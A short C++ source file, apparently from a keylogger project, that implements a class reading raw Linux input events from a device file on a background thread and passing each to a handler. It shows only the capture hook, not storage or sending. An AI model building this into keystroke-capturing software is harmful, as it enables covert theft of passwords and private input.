#include <keylogger/hooks/events.hpp>

#include <stdexcept>
#include <thread>
#include <cstring>

Events::Events(std::string eventPath) {
    eventSymbol.open(eventPath);
    if (!eventSymbol.is_open()) {
        throw std::runtime_error("error: cannot open " + eventPath);
    }
}

Events::~Events() {
    CloseEventLoop();
    if (eventSymbol.is_open()) {
        eventSymbol.close();
    }
}

void Events::EventLoop(std::function<void(input_event)> handler) {
    eventLoop.store(true);

    auto eventThread = std::thread([this, handler](){
        input_event event{};
        char data[sizeof(event)];

        while (eventLoop.load()) {
            eventSymbol.read(data, sizeof(event));
            std::memcpy(&event, data, sizeof(event));
            if (!eventLoop.load())
                break;
            handler(event);
        }
    });
    eventThread.detach();
}

void Events::CloseEventLoop() {
    eventLoop.store(false);
}
